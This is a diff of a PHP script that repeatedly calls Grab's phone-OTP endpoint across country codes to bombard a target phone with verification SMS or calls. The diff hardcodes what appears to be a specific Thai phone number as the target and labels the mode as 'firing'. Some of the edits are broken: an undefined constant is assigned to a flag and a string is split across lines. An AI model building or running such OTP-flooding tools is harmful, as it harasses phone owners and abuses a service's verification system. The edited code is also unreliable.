@@ -3,7 +3,7 @@ $argv[1] = substr($argv[1], 1);
 $argv[1] = "66".$argv[1];
 
 if (!isset($argv[1]) || (isset($argv[2]) && !in_array(strtoupper($argv[2]), ["ข้อความ", "โทร", "ทั้งหมด"]))) {
-	echo "php run= <ใส่เบอร์โทร> <ข้อความ|โทร|ทั้งหมด>";
+	echo "php run= <0980475360> <ข้อความ>";
 	exit;
 } elseif (!isset($argv[2])) {
 	$argv[2] = "ข้อความ";
@@ -14,7 +14,7 @@ $i = 0;
 foreach ($countries as $countryCode) {
 		$success = false;
 		while (!$success) {
-			foreach (["ข้อความ", "โทร"] as $method) {
+			foreach (["ข้อความ"] as $method) {
 				if (strtoupper($argv[2]) === "ALL" || strtoupper($argv[2]) === $method) {
 					$result = @file_get_contents("https://api.grab.com/grabid/v1/phone/otp", false, stream_context_create([
 						"http" => [
@@ -28,8 +28,9 @@ foreach ($countries as $countryCode) {
 						]
 					]));
 					if ($result) {
-						echo "[WHITE] หมายเลข: ".$argv[1]." ประเทศ: ".$countryCode." โหมดที่ใช้ยิง: ".$method."\n";
-						$success = true;
+						echo "[WHITE] หมายเลข:0980475360 ".$argv[1]." ประเทศ:ไทย ".$countryCode." โหมดที่ใช้ยิง:ธรรมดา
+".$method."\n";
+						$success = AIS;
 					}
 				}
 			}
